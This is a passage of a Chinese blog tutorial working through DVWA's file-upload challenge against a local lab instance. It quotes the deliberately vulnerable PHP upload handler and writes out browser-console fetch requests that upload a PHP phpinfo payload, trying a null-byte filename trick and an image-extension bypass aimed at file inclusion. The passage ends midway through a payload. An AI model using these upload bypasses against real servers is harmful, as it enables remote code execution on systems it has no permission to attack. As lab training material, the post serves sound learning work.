&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kr">await&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/upload/#&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;credentials&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;include&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;headers&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;User-Agent&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Accept&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Accept-Language&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;multipart/form-data; boundary=---------------------------257607891334311387353687588123&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Upgrade-Insecure-Requests&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Dest&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;document&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;navigate&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Site&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;same-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-User&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?1&amp;#34;&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="s2">&amp;#34;referrer&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/upload/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;body&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;MAX_FILE_SIZE\&amp;#34;\r\n\r\n100000\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;uploaded\&amp;#34;; filename=\&amp;#34;2.php\&amp;#34;\r\nContent-Type: image/jpeg\r\n\r\n&amp;lt;?php phpinfo(); ?&amp;gt;\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;Upload\&amp;#34;\r\n\r\nUpload\r\n-----------------------------257607891334311387353687588123--\r\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;method&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;POST&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;cors&amp;#34;&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>然后贴回浏览器控制台执行。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426163242992.png"
width="1236"
height="373"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426163242992_hue640e2923fb565d2fa9fc2b3061bf8de_44709_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426163242992_hue640e2923fb565d2fa9fc2b3061bf8de_44709_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426163242992"
class="gallery-image"
data-flex-grow="331"
data-flex-basis="795px"
>&lt;/p>
&lt;p>成功。&lt;/p>
&lt;h3 id="high难度">High难度&lt;/h3>
&lt;p>观察源码&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Upload&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Where are we going to be writing to?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">DVWA_WEB_PAGE_TO_ROOT&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s2">&amp;#34;hackable/uploads/&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$target_path&lt;/span> &lt;span class="o">.=&lt;/span> &lt;span class="nx">basename&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// File information
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$uploaded_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$uploaded_ext&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">substr&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">strrpos&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nv">$uploaded_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;size&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$uploaded_tmp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;tmp_name&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Is it an image?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">strtolower&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_ext&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;jpg&amp;#34;&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nx">strtolower&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_ext&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;jpeg&amp;#34;&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nx">strtolower&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_ext&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;png&amp;#34;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_size&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">100000&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;span class="nx">getimagesize&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_tmp&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Can we move the file to the upload folder?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">move_uploaded_file&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_tmp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// No
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Yes!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$target_path&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2"> succesfully uploaded!&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Invalid file
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded. We can only accept JPEG or PNG images.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>注意到改为使用文件后缀名判断，但取后缀名的逻辑有点意思：&lt;code>$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);&lt;/code>&lt;/p>
&lt;p>&lt;code>strrpos&lt;/code> 会返回最后一次出现&lt;code>.&lt;/code>的位置，然后&lt;code>substr&lt;/code>从这个位置+1截取字符串，比如&lt;code>1.jpg&lt;/code>就会取到&lt;code>jpg&lt;/code>。直觉告诉我可以转义或者&lt;code>%00&lt;/code>截断来解决这个问题，直接在 medium 难度的 payload 上改一改文件名&lt;code>1.php%00.jpg&lt;/code>，然后贴进控制台试试。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kr">await&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/upload/#&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;credentials&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;include&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;headers&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;User-Agent&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Accept&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Accept-Language&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;multipart/form-data; boundary=---------------------------257607891334311387353687588123&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Upgrade-Insecure-Requests&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Dest&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;document&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;navigate&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Site&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;same-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-User&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?1&amp;#34;&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="s2">&amp;#34;referrer&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/upload/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;body&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;MAX_FILE_SIZE\&amp;#34;\r\n\r\n100000\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;uploaded\&amp;#34;; filename=\&amp;#34;3.php%00.jpg\&amp;#34;\r\nContent-Type: image/jpeg\r\n\r\n&amp;lt;?php phpinfo(); ?&amp;gt;\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;Upload\&amp;#34;\r\n\r\nUpload\r\n-----------------------------257607891334311387353687588123--\r\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;method&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;POST&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;cors&amp;#34;&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>观察响应发现不成功。直接放弃转义的想法，重新审阅下代码，没想出怎么直接 bypass 了。不过考虑是可以利用 apache 或者 nginx 的文件名解析漏洞，但我这个容器用了新版 apache 所以大概是不可行的=。=&lt;/p>
&lt;p>另一种解法是利用文件包含漏洞，这个比较容易，改一下上面的 payload 把文件名改成 &lt;code>3.jpg&lt;/code>。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kr">await&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/upload/#&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;credentials&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;include&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;headers&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;User-Agent&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Accept&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Accept-Language&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;multipart/form-data; boundary=---------------------------257607891334311387353687588123&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Upgrade-Insecure-Requests&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Dest&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;document&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;navigate&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Site&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;same-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-User&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?1&amp;#34;&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="s2">&amp;#34;referrer&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/upload/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;body&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;MAX_FILE_SIZE\&amp;#34;\r\n\r\n100000\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;uploaded\&amp;#34;; filename=\&amp;#34;3.jpg\&amp;#34;\r\nContent-Type: image/jpeg\r\n\r\n&amp;lt;?php phpinfo(); ?&amp;gt;\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;Upload\&amp;#34;\r\n\r\nUpload\r\n-----------------------------257607891334311387353687588123--\r\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;method&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;POST&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;cors&amp;#34;&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>结果还是不行，重新审阅代码，注意到一个新出现的函数 &lt;code>getimagesize&lt;/code>，查询文档得知是获取图片大小的函数，可能会读取文件内容=，=而我的图片不是合法的图片所以就寄了。于是再改一改，直接这次把 payload 附加在正常图片后。不过这次选择的是 &lt;code>jpg&lt;/code> 后缀名和 &lt;code>svg&lt;/code> 文件内容（防止jpg图片的二进制数据把php解释器搞挂了）。payload 改成如下。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kr">await&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/upload/#&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;credentials&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;include&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;headers&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;User-Agent&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Accept&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Accept-Language&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;multipart/form-data; boundary=---------------------------257607891334311387353687588123&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Upgrade-Insecure-Requests&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
